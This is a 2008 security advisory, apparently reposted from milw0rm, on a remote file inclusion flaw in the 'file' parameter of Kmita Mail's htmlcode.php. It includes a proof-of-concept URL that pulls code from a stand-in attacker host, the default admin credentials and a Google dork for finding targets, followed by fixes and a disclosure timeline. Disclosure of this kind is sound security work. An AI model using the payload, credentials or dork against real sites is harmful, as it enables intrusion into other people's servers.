@@ -1,0 +1,89 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_94$2008
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_94$2008]   Kmita Mail <= 3.0 (file) Remote File Inclusion Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : May, 5 th 2008
+Location       : Jakarta, Indonesia
+Web            : http://advisories.echo.or.id/adv/adv94-K-159-2008.txt
+Critical Lvl   : High
+Impact	       : System access
+Where	       : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : Kmita Mail
+version       : <= 3.0
+Vendor        : http://www.kmitascripts.com/kmitamhome/
+Description   :
+
+Easy, fastest and Secure form processor. Installs directly from the server pre configured to your server. No programming hassles, no opening code files. Kmita Mail v.3 has inbuilt 3 levels of spam protection and has features like security image (CAPTCHA). The script works in backend, so you have full control over your web design. Supports most basic contact forms, feedback forms, order forms and other feature which you may like to use : Multiple visitor file UPLOADS, Auto responder with attachment, Success Page, Error Page, Validation ,To CC BCC email addresses. Kmita Mail has its own ADMIN utility and handles UNLIMITED FORMS with one installation. Best for novices and experts who want to SAVE precious TIME
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+Input passed to the "file" parameter in htmlcode.php is not properly verified before being used to include files. 
+This can be exploited to include arbitrary files from local or external resources.
+Successful exploitation requires that "register_globals" is enabled.
+
+
+Poc/Exploit:
+~~~~~~~~~
+
+http://www.target.com/kmitaadmin/kmitam/htmlcode.php?file=http://attacker.com/evil?
+
+Note: sometimes need to login first.the default user & password are admin
+
+Dork:
+~~~~
+Google    : "inurl:/kmitam/"
+ 
+
+Solution:
+~~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- Turn off register_globals in php.ini
+ 
+
+Timeline:
+~~~~~~~~
+
+- 02 - 05 - 2008 bug found
+- 05 - 05 - 2008 vendor contacted
+- 05 - 05 - 2008 advisory released
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, zautha my light of eyes, for all the luv the tears n the breath
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke
+~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b
+~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy, ketut, rizal, cR4SH3R, kuntua, stev_manado, nofry,k1tk4t,0pt1c
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+~ special for rgod - good bye mate, thanks for the great works.
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://k-159.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2008-05-05]
